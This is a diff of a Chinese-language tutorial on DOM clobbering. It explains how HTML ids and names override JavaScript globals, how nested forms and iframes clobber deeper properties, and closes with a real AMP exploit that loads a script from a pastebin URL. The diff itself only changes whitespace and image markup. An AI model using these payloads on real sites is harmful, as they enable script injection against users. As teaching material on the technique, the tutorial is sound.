@@ -80,9 +80,9 @@ document.getElementById('btn')
 这个行为是我几年前在脸书的前端社群无意间得知的，那就是你在 HTML 里面设定一个有 id 的元素之后，在 JS 里面就可以直接存取到它：
 
 ```html
-<button id="btn">click me</button>  
-<script>  
-  console.log(window.btn) // <button id="btn">click me</button>  
+<button id="btn">click me</button>
+<script>
+  console.log(window.btn) // <button id="btn">click me</button>
 </script>
 ```
 
@@ -98,7 +98,7 @@ btn.onclick = () => alert(1)
 
 而这个行为是有明确定义在 spec 上的，在 [7.3.3 Named access on the Window object](https://html.spec.whatwg.org/multipage/window-object.html#named-access-on-the-window-object)：
 
-![[Pasted image 20221108184725.png|800]]
+![[Pasted image 20221108184725.png]]
 
 帮大家节录两个重点：
 
@@ -109,9 +109,9 @@ btn.onclick = () => alert(1)
 也就是说除了 id 可以直接用 window 存取到以外，`embed`, `form`, `img` 跟 `object` 这四个 tag 用 name 也可以存取到：
 
 ```html
-<embed name="a"></embed>  
-<form name="b"></form>  
-<img name="c" />  
+<embed name="a"></embed>
+<form name="b"></form>
+<img name="c" />
 <object name="d"></object>
 ```
 
@@ -138,7 +138,7 @@ btn.onclick = () => alert(1)
   <h1>留言板</h1>
   <div>
     你的留言：哈囉大家好
-  </div> 
+  </div>
   <script>
     if (window.TEST_MODE) {
       // load test script
@@ -160,27 +160,27 @@ btn.onclick = () => alert(1)
 所以呢，你可以这样做：
 
 ```html
-<!DOCTYPE html>  
-<html>  
-<head>  
-  <meta charset="utf-8">  
-  <meta name="viewport" content="width=device-width, initial-scale=1">  
-</head>  
-<body>  
-  <h1>留言板</h1>  
-  <div>  
-    你的留言：<div id="TEST_MODE"></div>  
-    <a id="TEST_SCRIPT_SRC" href="my_evil_script"></a>  
-  </div>   
-  <script>  
-    if (window.TEST_MODE) {  
-      // load test script  
-      var script = document.createElement('script')  
-      script.src = window.TEST_SCRIPT_SRC  
-      document.body.appendChild(script)  
-    }  
-  </script>  
-</body>  
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+</head>
+<body>
+  <h1>留言板</h1>
+  <div>
+    你的留言：<div id="TEST_MODE"></div>
+    <a id="TEST_SCRIPT_SRC" href="my_evil_script"></a>
+  </div>
+  <script>
+    if (window.TEST_MODE) {
+      // load test script
+      var script = document.createElement('script')
+      script.src = window.TEST_SCRIPT_SRC
+      document.body.appendChild(script)
+    }
+  </script>
+</body>
 </html>
 ```
 
@@ -191,7 +191,7 @@ btn.onclick = () => alert(1)
 在大多数的状况中，只是把一个变数覆盖成 HTML 元素是不够的，例如说你把上面那段程式码当中的 `window.TEST_MODE` 转成字串印出来：
 
 ```js
-// <div id="TEST_MODE" />  
+// <div id="TEST_MODE" />
 console.log(window.TEST_MODE + '')
 ```
 
@@ -199,7 +199,7 @@ console.log(window.TEST_MODE + '')
 
 把一个 HTML 元素转成字串就是这样，会变成这种形式，如果是这样的话那基本上没办法利用。但幸好在 HTML 里面有两个元素在 toString 的时候会做特殊处理：`<base>` 跟 `<a>`：
 
-![[Pasted image 20221109143255.png|800]]
+![[Pasted image 20221109143255.png]]
 
 来源：[4.6.3 API for a and area elements](https://html.spec.whatwg.org/#api-for-a-and-area-elements)
 
@@ -216,19 +216,19 @@ console.log(window.TEST_MODE + '')
 不过这边要提醒大家一件事，如果你想攻击的变数已经存在的话，你用 DOM 是覆盖不掉的，例如说：
 
 ```html
-<!DOCTYPE html>  
-<html>  
-<head>  
-  <script>  
-    TEST_MODE = 1  
-  </script>  
-</head>  
-<body>  
-  <div id="TEST_MODE"></div>   
-  <script>  
-    console.log(window.TEST_MODE) // 1  
-  </script>  
-</body>  
+<!DOCTYPE html>
+<html>
+<head>
+  <script>
+    TEST_MODE = 1
+  </script>
+</head>
+<body>
+  <div id="TEST_MODE"></div>
+  <script>
+    console.log(window.TEST_MODE) // 1
+  </script>
+</body>
 </html>
 ```
 
@@ -242,24 +242,24 @@ console.log(window.TEST_MODE + '')
 
 在 HTML 的 [spec](https://www.w3.org/TR/html52/sec-forms.html) 中有这样一段：
 
-![[Pasted image 20221109143517.png|800]]
+![[Pasted image 20221109143517.png]]
 
 可以利用 `form[name]` 或是 `form[id]` 去拿它底下的元素，例如说：
 
 ```html
-<!DOCTYPE html>  
-<html>  
-<body>  
-  <form id="config">  
-    <input name="isTest" />  
-    <button id="isProd"></button>  
-  </form>  
-  <script>  
-    console.log(config) // <form id="config">  
-    console.log(config.isTest) // <input name="isTest" />  
-    console.log(config.isProd) // <button id="isProd"></button>  
-  </script>  
-</body>  
+<!DOCTYPE html>
+<html>
+<body>
+  <form id="config">
+    <input name="isTest" />
+    <button id="isProd"></button>
+  </form>
+  <script>
+    console.log(config) // <form id="config">
+    console.log(config.isTest) // <input name="isTest" />
+    console.log(config.isProd) // <button id="isProd"></button>
+  </script>
+</body>
 </html>
 ```
 
@@ -268,16 +268,16 @@ console.log(window.TEST_MODE + '')
 这边比较有可能利用的机会是，当你要覆盖的东西是用 `value` 存取的时候，例如说：`config.enviroment.value`，就可以利用 input 的 value 属性做覆盖：
 
 ```html
-<!DOCTYPE html>  
-<html>  
-<body>  
-  <form id="config">  
-    <input name="enviroment" value="test" />  
-  </form>  
-  <script>  
-    console.log(config.enviroment.value) // test  
-  </script>  
-</body>  
+<!DOCTYPE html>
+<html>
+<body>
+  <form id="config">
+    <input name="enviroment" value="test" />
+  </form>
+  <script>
+    console.log(config.enviroment.value) // test
+  </script>
+</body>
 </html>
 ```
 
@@ -287,20 +287,20 @@ console.log(window.TEST_MODE + '')
 
 在我们稍早看到的关于 `Named access on the Window object` 的 spec 当中，决定值是什么的段落是这样写的：
 
-![[Pasted image 20221109144207.png|800]]
+![[Pasted image 20221109144207.png]]
 
 如果要回传的东西有多个，就回传 HTMLCollection。
 
 ```html
-<!DOCTYPE html>  
-<html>  
-<body>  
-  <a id="config"></a>  
-  <a id="config"></a>  
-  <script>  
-    console.log(config) // HTMLCollection(2)  
-  </script>  
-</body>  
+<!DOCTYPE html>
+<html>
+<body>
+  <a id="config"></a>
+  <a id="config"></a>
+  <script>
+    console.log(config) // HTMLCollection(2)
+  </script>
+</body>
 </html>
 ```
 
@@ -311,16 +311,16 @@ console.log(window.TEST_MODE + '')
 像是这样：
 
 ```html
-<!DOCTYPE html>  
-<html>  
-<body>  
-  <a id="config"></a>  
-  <a id="config" name="apiUrl" href="https://huli.tw"></a>  
-  <script>  
-    console.log(config.apiUrl + '')  
-    // https://huli.tw  
-  </script>  
-</body>  
+<!DOCTYPE html>
+<html>
+<body>
+  <a id="config"></a>
+  <a id="config" name="apiUrl" href="https://huli.tw"></a>
+  <script>
+    console.log(config.apiUrl + '')
+    // https://huli.tw
+  </script>
+</body>
 </html>
 ```
 
@@ -329,17 +329,17 @@ console.log(window.TEST_MODE + '')
 而如果我们把 form 跟 HTMLCollection 结合在一起，就能够达成三层：
 
 ```html
-<!DOCTYPE html>  
-<html>  
-<body>  
-  <form id="config"></form>  
-  <form id="config" name="prod">  
-    <input name="apiUrl" value="123" />  
-  </form>  
-  <script>  
-    console.log(config.prod.apiUrl.value) //123  
-  </script>  
-</body>  
+<!DOCTYPE html>
+<html>
+<body>
+  <form id="config"></form>
+  <form id="config" name="prod">
+    <input name="apiUrl" value="123" />
+  </form>
+  <script>
+    console.log(config.prod.apiUrl.value) //123
+  </script>
+</body>
 </html>
 ```
 
@@ -356,18 +356,18 @@ console.log(window.TEST_MODE + '')
 当你建了一个 iframe 并且给它一个 name 的时候，用这个 name 就可以指到 iframe 里面的 window，所以可以像这样：
 
 ```html
-<!DOCTYPE html>  
-<html>  
-<body>  
-  <iframe name="config" srcdoc='  
-    <a id="apiUrl"></a>  
-  '></iframe>  
-  <script>  
-    setTimeout(() => {  
-      console.log(config.apiUrl) // <a id="apiUrl"></a>  
-    }, 500)  
-  </script>  
-</body>  
+<!DOCTYPE html>
+<html>
+<body>
+  <iframe name="config" srcdoc='
+    <a id="apiUrl"></a>
+  '></iframe>
+  <script>
+    setTimeout(() => {
+      console.log(config.apiUrl) // <a id="apiUrl"></a>
+    }, 500)
+  </script>
+</body>
 </html>
 ```
 
@@ -376,81 +376,81 @@ console.log(window.TEST_MODE + '')
 有了 iframe 的帮助之后，就可以创造出更多层级：
 
 ```html
-<!DOCTYPE html>  
-<html>  
-<body>  
-  <iframe name="moreLevel" srcdoc='  
-    <form id="config"></form>  
-    <form id="config" name="prod">  
-      <input name="apiUrl" value="123" />  
-    </form>  
-  '></iframe>  
-  <script>  
-    setTimeout(() => {  
-      console.log(moreLevel.config.prod.apiUrl.value) //123  
-    }, 500)  
-  </script>  
-</body>  
+<!DOCTYPE html>
+<html>
+<body>
+  <iframe name="moreLevel" srcdoc='
+    <form id="config"></form>
+    <form id="config" name="prod">
+      <input name="apiUrl" value="123" />
+    </form>
+  '></iframe>
+  <script>
+    setTimeout(() => {
+      console.log(moreLevel.config.prod.apiUrl.value) //123
+    }, 500)
+  </script>
+</body>
 </html>
 ```
 
 理论上你可以在 iframe 里面再用一个 iframe，就可以达成无限多层级的 DOM clobbering，不过我试了一下发现可能有点编码的问题需要处理，例如说像是这样：
 
 ```html
-<!DOCTYPE html>  
-<html>  
-<body>  
-  <iframe name="level1" srcdoc='  
-    <iframe name="level2" srcdoc="  
-      <iframe name="level3"></iframe>  
-    "></iframe>  
-  '></iframe>  
-  <script>  
-    setTimeout(() => {  
-      console.log(level1.level2.level3) // undefined  
-    }, 500)  
-  </script>  
-</body>  
+<!DOCTYPE html>
+<html>
+<body>
+  <iframe name="level1" srcdoc='
+    <iframe name="level2" srcdoc="
+      <iframe name="level3"></iframe>
+    "></iframe>
+  '></iframe>
+  <script>
+    setTimeout(() => {
+      console.log(level1.level2.level3) // undefined
+    }, 500)
+  </script>
+</body>
 </html>
 ```
 
 印出来会是 undefined，但如果把 level3 的那两个双引号拿掉，直接写成 `name=level3` 就可以成功印出东西来，我猜是因为单引号双引号的一些解析问题造成的，目前还没找到什么解法，只尝试了这样是 ok 的，但是再往下就出错了：
 
 ```html
-<!DOCTYPE html>  
-<html>  
-<body>  
-  <iframe name="level1" srcdoc="  
-    <iframe name=&quot;level2&quot; srcdoc=&quot;  
-      <iframe name='level3' srcdoc='  
-        <iframe name=level4></iframe>  
-      '></iframe>  
-    &quot;></iframe>  
-  "></iframe>  
-  <script>  
-    setTimeout(() => {  
-      console.log(level1.level2.level3.level4)  
-    }, 500)  
-  </script>  
-</body>  
+<!DOCTYPE html>
+<html>
+<body>
+  <iframe name="level1" srcdoc="
+    <iframe name=&quot;level2&quot; srcdoc=&quot;
+      <iframe name='level3' srcdoc='
+        <iframe name=level4></iframe>
+      '></iframe>
+    &quot;></iframe>
+  "></iframe>
+  <script>
+    setTimeout(() => {
+      console.log(level1.level2.level3.level4)
+    }, 500)
+  </script>
+</body>
 </html>
 ```
 
 用这样就可以无限多层了:
 
 ```html
-<iframe name=a srcdoc="  
-  <iframe name=b srcdoc=&quot  
-    <iframe name=c srcdoc=&amp;quot;  
-      <iframe name=d srcdoc=&amp;amp;quot;  
-        <iframe name=e srcdoc=&amp;amp;amp;quot;  
-          <iframe name=f srcdoc=&amp;amp;amp;amp;quot;  
-            <div id=g>123</div>  
-          &amp;amp;amp;amp;quot;></iframe>  
-        &amp;amp;amp;quot;></iframe>  
-      &amp;amp;quot;></iframe>  
-    &amp;quot;></iframe>  
-  &quot></iframe>  
+<iframe name=a srcdoc="
+  <iframe name=b srcdoc=&quot
+    <iframe name=c srcdoc=&amp;quot;
+      <iframe name=d srcdoc=&amp;amp;quot;
+        <iframe name=e srcdoc=&amp;amp;amp;quot;
+          <iframe name=f srcdoc=&amp;amp;amp;amp;quot;
+            <div id=g>123</div>
+          &amp;amp;amp;amp;quot;></iframe>
+        &amp;amp;amp;quot;></iframe>
+      &amp;amp;quot;></iframe>
+    &amp;quot;></iframe>
+  &quot></iframe>
 "></iframe>
 ```
 
@@ -463,25 +463,25 @@ console.log(window.TEST_MODE + '')
 但是有人发现可以在 HTML 元素上面设置 id，又发现当他设置了一个 `<a id="AMP_MODE">` 之后，console 突然出现一个载入 script 的错误，而且网址中的其中一段是 undefined。仔细去研究程式码之后，有一段程式码大概是这样的：
 
 ```js
-var script = window.document.createElement("script");  
-script.async = false;  
-  
-var loc;  
-if (AMP_MODE.test && window.testLocation) {  
-    loc = window.testLocation  
-} else {  
-    loc = window.location;  
-}  
-  
-if (AMP_MODE.localDev) {  
-    loc = loc.protocol + "//" + loc.host + "/dist"  
-} else {  
-    loc = "https://cdn.ampproject.org";  
-}  
-  
-var singlePass = AMP_MODE.singlePassType ? AMP_MODE.singlePassType + "/" : "";  
-b.src = loc + "/rtv/" + AMP_MODE.rtvVersion; + "/" + singlePass + "v0/" + pluginName + ".js";  
-  
+var script = window.document.createElement("script");
+script.async = false;
+
+var loc;
+if (AMP_MODE.test && window.testLocation) {
+    loc = window.testLocation
+} else {
+    loc = window.location;
+}
+
+if (AMP_MODE.localDev) {
+    loc = loc.protocol + "//" + loc.host + "/dist"
+} else {
+    loc = "https://cdn.ampproject.org";
+}
+
+var singlePass = AMP_MODE.singlePassType ? AMP_MODE.singlePassType + "/" : "";
+b.src = loc + "/rtv/" + AMP_MODE.rtvVersion; + "/" + singlePass + "v0/" + pluginName + ".js";
+
 document.head.appendChild(b);
 ```
 
@@ -490,13 +490,13 @@ document.head.appendChild(b);
 所以 exploit 会长的像这样：
 
 ```html
-// 讓 AMP_MODE.test 跟 AMP_MODE.localDev 有東西  
-<a id="AMP_MODE" name="localDev"></a>  
-<a id="AMP_MODE" name="test"></a>  
-  
-// 設置 testLocation.protocol  
-<a id="testLocation"></a>  
-<a id="testLocation" name="protocol"   
+// 讓 AMP_MODE.test 跟 AMP_MODE.localDev 有東西
+<a id="AMP_MODE" name="localDev"></a>
+<a id="AMP_MODE" name="test"></a>
+
+// 設置 testLocation.protocol
+<a id="testLocation"></a>
+<a id="testLocation" name="protocol"
    href="https://pastebin.com/raw/0tn8z0rG#"></a>
 ```
 
